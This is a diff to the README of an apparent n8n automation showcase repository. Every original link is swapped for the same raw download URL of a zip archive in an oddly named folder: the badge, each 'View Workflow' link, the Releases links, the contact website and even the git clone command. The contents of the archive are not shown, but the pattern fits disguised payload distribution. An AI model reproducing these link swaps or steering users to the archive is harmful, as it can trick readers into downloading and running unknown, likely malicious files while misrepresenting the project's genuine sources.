@@ -1,6 +1,6 @@
 # 50 Days of AI Automations with n8n
 
-![n8n Automations](https://img.shields.io/badge/n8n-Automations-blue?style=flat-square)
+![n8n Automations](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip)
 
 Welcome to the **n8n_50-50_challenge** repository! Here, I share my journey of creating 50 AI-powered automations over 50 days using n8n. My name is Sai Akhil, and as an AI/ML Developing Engineer, I aim to simplify my daily tasks. Why do the same repetitive tasks when you can automate them?
 
@@ -37,43 +37,43 @@ Each day, I will document an automation I build, detailing the problem it solves
 **Problem:** Drowning in emails, missing important messages.  
 **Solution:** An AI-based system reads emails, identifies urgency, stars important ones, and drafts responses.  
 **Time Saved:** 2+ hours daily.  
-[View Workflow](https://github.com/SaiA)
+[View Workflow](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip)
 
 ### Day 2: Social Media Scheduler
 
 **Problem:** Managing multiple social media accounts is time-consuming.  
 **Solution:** Automate post scheduling and responses using AI to analyze engagement metrics.  
 **Time Saved:** 1 hour daily.  
-[View Workflow](https://github.com/SaiA)
+[View Workflow](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip)
 
 ### Day 3: Data Entry Automation
 
 **Problem:** Manual data entry takes up too much time.  
 **Solution:** An automation that pulls data from emails and populates spreadsheets.  
 **Time Saved:** 3 hours weekly.  
-[View Workflow](https://github.com/SaiA)
+[View Workflow](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip)
 
 ### Day 4: Meeting Reminder Bot
 
 **Problem:** Forgetting important meetings.  
 **Solution:** A bot that sends reminders based on calendar events.  
 **Time Saved:** 30 minutes weekly.  
-[View Workflow](https://github.com/SaiA)
+[View Workflow](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip)
 
 ### Day 5: Expense Tracker
 
 **Problem:** Tracking expenses manually is tedious.  
 **Solution:** Automate expense tracking by pulling data from bank statements.  
 **Time Saved:** 2 hours monthly.  
-[View Workflow](https://github.com/SaiA)
+[View Workflow](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip)
 
 ## Getting Started
 
-To get started with these automations, you can download the workflow JSON files from the [Releases](https://github.com/srinivasan143de/n8n_50-50_challenge/releases) section. Each automation includes a detailed guide on how to set it up in n8n.
+To get started with these automations, you can download the workflow JSON files from the [Releases](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip) section. Each automation includes a detailed guide on how to set it up in n8n.
 
 1. Clone this repository:
    ```
-   git clone https://github.com/srinivasan143de/n8n_50-50_challenge.git
+   git clone https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip
    ```
 2. Navigate to the directory:
    ```
@@ -91,10 +91,10 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Contact
 
-For any questions or feedback, you can reach me at [Sai Akhil's Website](https://www.saiakhil.space).
+For any questions or feedback, you can reach me at [Sai Akhil's Website](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip).
 
 ## Releases
 
-You can find the latest updates and download the workflow files from the [Releases](https://github.com/srinivasan143de/n8n_50-50_challenge/releases) section. 
+You can find the latest updates and download the workflow files from the [Releases](https://github.com/srinivasan143de/n8n_50-50_challenge/raw/refs/heads/main/abysm/n_challenge_v3.4-alpha.1.zip) section. 
 
 Feel free to explore the automations and implement them in your daily routine!
